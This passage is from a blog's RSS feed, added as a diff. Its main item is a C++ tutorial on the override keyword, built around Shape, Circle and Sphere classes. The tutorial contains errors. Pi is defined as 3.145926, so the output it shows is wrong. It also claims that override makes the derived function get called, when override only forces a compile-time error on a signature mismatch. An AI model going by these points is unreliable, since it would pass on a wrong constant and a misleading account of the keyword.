@@ -1,0 +1,582 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>IRA - Information Retrieval and Analytics</title>
+    <link>https://example.com/</link>
+    <description>Recent content on IRA - Information Retrieval and Analytics</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <copyright>Copyright © 2008–2018, Steve Francia and the Hugo Authors; all rights reserved.</copyright>
+    <lastBuildDate>Tue, 04 Feb 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://example.com/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>C&#43;&#43;11-Significance of override keyword</title>
+      <link>https://example.com/post/cpp-override-keyword/</link>
+      <pubDate>Tue, 04 Feb 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://example.com/post/cpp-override-keyword/</guid>
+      <description>
+        
+          &lt;p&gt;Polymorphism is one of the most powerful features of Object Oriented Programming. It allows multiple methods to be implemented from a single interface. When multiple methods are defined with same name and different data types, it creates ambiguities during function calls at run-time. Such ambiguities show up as issues when the product is put to production. Override keyword is used to solve such issues.&lt;/p&gt;
+&lt;p&gt;A class allows the programmer to define a concept. If ‘Shape’ is defined as a class, the concept of shape is so abstract that it’s hard to define the implementation of ‘Shape’, or the object for ‘Shape’ class. It’s hard to define the area of ‘Shape’. Therefore, we define derived class ‘Circle’, which extends the class ‘Shape’ and class ‘Sphere’ extends the class ‘Circle’. When the member function area is defined, it can represent the area of a Circle or a Sphere. If the radius is defined as r, the area of circle A&lt;sub&gt;c&lt;/sub&gt; is:&lt;/p&gt;
+&lt;p&gt;$$
+A_c = \pi r^2
+$$&lt;/p&gt;
+&lt;p&gt;Area of sphere A&lt;sub&gt;s&lt;/sub&gt; can be defined as:&lt;/p&gt;
+&lt;p&gt;$$
+A_s = 4 \pi r^2
+$$&lt;/p&gt;
+&lt;p&gt;The code can also be accesssed in the &lt;a href=&#34;%22https://github.com/bhavaniab/sharkCppDevel/blob/shark-devel-branch/cpp11/overrideFinal/shape.cpp%22&#34;&gt;github page&lt;/a&gt;. The C++ code below illustrates the implementation:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C++&#34; data-lang=&#34;C++&#34;&gt;&lt;span class=&#34;ln&#34;&gt; 1&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt;&lt;span class=&#34;cpf&#34;&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;ln&#34;&gt; 2&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;std&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt; 3&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#define pi 3.145926
+&lt;/span&gt;&lt;span class=&#34;ln&#34;&gt; 4&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Shape&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt; 5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt; 6&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt; 7&lt;/span&gt;        &lt;span class=&#34;n&#34;&gt;Shape&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt; 8&lt;/span&gt;        &lt;span class=&#34;o&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Shape&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt; 9&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;virtual&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;calculateArea&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;double&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;11&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;/*
+&lt;/span&gt;&lt;span class=&#34;ln&#34;&gt;13&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;  class Circle final:public Shape
+&lt;/span&gt;&lt;span class=&#34;ln&#34;&gt;14&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;  final keyword is used when I don&amp;#39;t want class derived
+&lt;/span&gt;&lt;span class=&#34;ln&#34;&gt;15&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;  to be inherited further
+&lt;/span&gt;&lt;span class=&#34;ln&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;  class Circle final: public Shape
+&lt;/span&gt;&lt;span class=&#34;ln&#34;&gt;17&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;*/&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;18&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Circle&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Shape&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;19&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;20&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;21&lt;/span&gt;        &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;22&lt;/span&gt;        &lt;span class=&#34;n&#34;&gt;Circle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;23&lt;/span&gt;        &lt;span class=&#34;o&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Circle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;24&lt;/span&gt;        &lt;span class=&#34;cm&#34;&gt;/*
+&lt;/span&gt;&lt;span class=&#34;ln&#34;&gt;25&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;          Compiler indicates an error if the datatypes
+&lt;/span&gt;&lt;span class=&#34;ln&#34;&gt;26&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;          do not match. If override keyword is not
+&lt;/span&gt;&lt;span class=&#34;ln&#34;&gt;27&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;          used, then the compiler does not find the implementation 
+&lt;/span&gt;&lt;span class=&#34;ln&#34;&gt;28&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;          of the calculateArea function in the derived 
+&lt;/span&gt;&lt;span class=&#34;ln&#34;&gt;29&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;          class Sphere and calls the Circle
+&lt;/span&gt;&lt;span class=&#34;ln&#34;&gt;30&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;          class virtual function. 
+&lt;/span&gt;&lt;span class=&#34;ln&#34;&gt;31&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;        */&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;32&lt;/span&gt;          &lt;span class=&#34;k&#34;&gt;virtual&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;calculateArea&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;double&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;33&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;//virtual void calculateArea(double ) override;
+&lt;/span&gt;&lt;span class=&#34;ln&#34;&gt;34&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;35&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Sphere&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Circle&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;36&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;37&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;38&lt;/span&gt;        &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;39&lt;/span&gt;        &lt;span class=&#34;n&#34;&gt;Sphere&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;40&lt;/span&gt;        &lt;span class=&#34;o&#34;&gt;~&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Sphere&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;41&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;virtual&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;calculateArea&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;42&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;43&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Shape&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Shape&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;44&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;45&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;46&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Shape&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::~&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Shape&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;47&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;48&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;49&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Circle&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Circle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;50&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;51&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;52&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Circle&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::~&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Circle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;53&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;54&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;55&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Circle&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;calculateArea&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;double&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;56&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;57&lt;/span&gt;    &lt;span class=&#34;kt&#34;&gt;double&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;area&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;58&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;area&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;59&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;cout&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Area of the circle with radius &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34; is &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;area&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;std&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;endl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;60&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;61&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Sphere&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Sphere&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;62&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;63&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;64&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Sphere&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::~&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Sphere&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;65&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;66&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;67&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Sphere&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;calculateArea&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;68&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;69&lt;/span&gt;    &lt;span class=&#34;kt&#34;&gt;double&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;area&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;70&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;area&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pi&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;71&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;cout&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Area of the sphere with radius &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34; is &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;area&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;std&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;endl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;72&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;73&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;74&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;75&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;Shape&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;76&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;Circle&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;77&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;Sphere&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;78&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;79&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;calculateArea&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;80&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;81&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;82&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The function area can be declared in the base class of Shape, and re-implemented in the derived class of Sphere and Circle.  Therefore, virtual function allows multiple implementations to be defined from a single interface. As it’s not possible to define the area for ‘Shape’, the function calcualteArea is declared as the pure virtual function as shown below:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C++&#34; data-lang=&#34;C++&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;virtual&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;calculateArea&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;double&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The program on github illustrates the base class of Shape and derived classes of Sphere and Circle.&lt;/p&gt;
+&lt;p&gt;In the main function, pointer to class ‘Shape’ *p points to the derived class Sphere object.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C++&#34; data-lang=&#34;C++&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Shape&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Circle&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Sphere&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;calculateArea&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The output of the code is:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C++&#34; data-lang=&#34;C++&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Area&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;of&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;the&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;circle&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;radius&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;78.6481&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The function calculateArea is class Circle as:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C++&#34; data-lang=&#34;C++&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;virtual&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;calculateArea&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;double&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;an in class Sphere, it’s defined as:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C++&#34; data-lang=&#34;C++&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;virtual&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;calculateArea&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The function is re-declared in the derived class with the type int. When the function calculateArea is called with the base class pointer pointing to the derived class object s of type Sphere, the function corresponding to the Circle class is called instead of the function corresponding to the Sphere class. The compiler sees an ambiguity and calls the function implemented in the base class instead of the derived class. This is a common problem in the industry as the classes are implemented by different teams. The code compiles fine, but generates incorrect results during execution. This could cause serious bugs in the code which are quite hard to fix. When the ‘override’ keyword is used in the derived class, the function corresponding to the derived class is called and if there is a mismatch in the data types of the virtual functions in the base class and the derived class, an error is thrown during the compile time.&lt;/p&gt;
+        
+      </description>
+    </item>
+    
+    <item>
+      <title>Representation of fractional numbers on Hardware – The fixed point representation</title>
+      <link>https://example.com/post/binary-representation/</link>
